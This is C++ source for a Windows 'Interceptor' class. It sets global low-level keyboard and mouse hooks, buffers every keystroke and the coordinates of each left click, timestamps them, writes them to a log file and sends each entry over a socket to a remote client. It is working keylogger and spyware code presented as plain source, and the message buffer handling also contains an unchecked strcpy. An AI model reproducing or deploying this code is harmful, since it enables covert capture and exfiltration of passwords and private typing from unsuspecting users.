#include "Interceptor.h"

LRESULT CALLBACK InterceptorCallBacks::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    static Interceptor* interceptor = Interceptor::getInstance();
    if (nCode < 0)
    {
        return CallNextHookEx(interceptor->getKeyboardHookDescr(), nCode, wParam, lParam);
    }

    if (nCode == HC_ACTION) {
        if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN))
        {
            KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
            char symbl = (char)pKeyBoard->vkCode;

            switch (pKeyBoard->vkCode)
            {
            case VK_BACK:
                if (!interceptor->getBuffer().empty())
                {
                    if (interceptor->getPrevSmbl() != pKeyBoard->vkCode)
                    {
                        interceptor->writeToFileBuffNotClear();
                    }
                    interceptor->getBuffer().pop_back();
                }
                break;
            case VK_RETURN:
            case VK_OEM_PERIOD:
                if (interceptor->getPrevSmbl() != pKeyBoard->vkCode)
                    interceptor->writeToFile();
                break;
            default:
                interceptor->getBuffer().push_back(symbl);
                break;
            }
            interceptor->setPrevSmbl(pKeyBoard->vkCode);
        }
    }

    return CallNextHookEx(interceptor->getKeyboardHookDescr(), nCode, wParam, lParam);
}

LRESULT CALLBACK InterceptorCallBacks::MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    static Interceptor* interceptor = Interceptor::getInstance();
    static char coords[32];

    if (nCode < 0)
    {
        return CallNextHookEx(interceptor->getMouseHookDesct(), nCode, wParam, lParam);
    }

    if (wParam == WM_LBUTTONDOWN)
    {
        MOUSEHOOKSTRUCT* pMouseStruct = (MOUSEHOOKSTRUCT*)lParam;

        if (interceptor->getBuffer().size() != 0)
            interceptor->writeToFile();

        sprintf(coords, "%d:%d", pMouseStruct->pt.x, pMouseStruct->pt.y);
        interceptor->getBuffer() = coords;
        interceptor->writeToFile();
    }

    return CallNextHookEx(interceptor->getMouseHookDesct(), nCode, wParam, lParam);
}

// ---- Interceptor ----

Interceptor* Interceptor::instance = NULL;

Interceptor::Interceptor(){}

Interceptor* Interceptor::getInstance() {

    if (instance == NULL)
        instance = new Interceptor;

    return instance;
}

int Interceptor::init(const char* fileDest, const SOCKET& _socketDescr) {

    if (initFile(fileDest) == -1)
        return -1;

    if (initHooks() == -1)
        return -1;

    socketDescr = _socketDescr;
    prevSmbl = NULL;

    return 0;
}

void Interceptor::getCurrentTime() {
    static time_t curTime;

    curTime = time(0);
    curDateTime = ctime(&curTime);
}

void Interceptor::writeToFile() {
    getCurrentTime();
    writeToFileBuffNotClear();
    sendMessageToClient();

    buffer.clear();
}
void Interceptor::writeToFileBuffNotClear()
{
    file << buffer << " " << curDateTime;
    file.flush();
}

void Interceptor::sendMessageToClient() {
    std::string message = buffer + " ";
    message += curDateTime;

    char messageS[1024];
    strcpy(messageS, message.c_str());

    send(socketDescr, messageS, sizeof(messageS), NULL);
}

int Interceptor::initHooks() {
    appDescr = GetModuleHandle(NULL);
    if (appDescr == NULL)
        return -1;

    keyboardHookDescr = SetWindowsHookEx(WH_KEYBOARD_LL,
        InterceptorCallBacks::KeyboardProc,
        appDescr,
        NULL);
    if (keyboardHookDescr == NULL)
        return -1;

    mouseHookDesct = SetWindowsHookEx(WH_MOUSE_LL,
        InterceptorCallBacks::MouseProc,
        appDescr,
        NULL);
    if (mouseHookDesct == NULL)
        return -1;

    return 0;
}

int Interceptor::initFile(const char* fileDest) {

    file.open(fileDest, std::ios_base::app);
    if (!file.is_open())
        return -1;

    return 0;
}

HHOOK Interceptor::getKeyboardHookDescr()
{
    return keyboardHookDescr;
}
HHOOK Interceptor::getMouseHookDesct()
{
    return mouseHookDesct;
}
DWORD Interceptor::getPrevSmbl()
{
    return prevSmbl;
}
void Interceptor::setPrevSmbl(const DWORD& _prevSmbl)
{
    prevSmbl = _prevSmbl;
}
std::string& Interceptor::getBuffer() {
    return buffer;
}

Interceptor::~Interceptor() {
    writeToFile();
    file.close();
    delete instance;
}
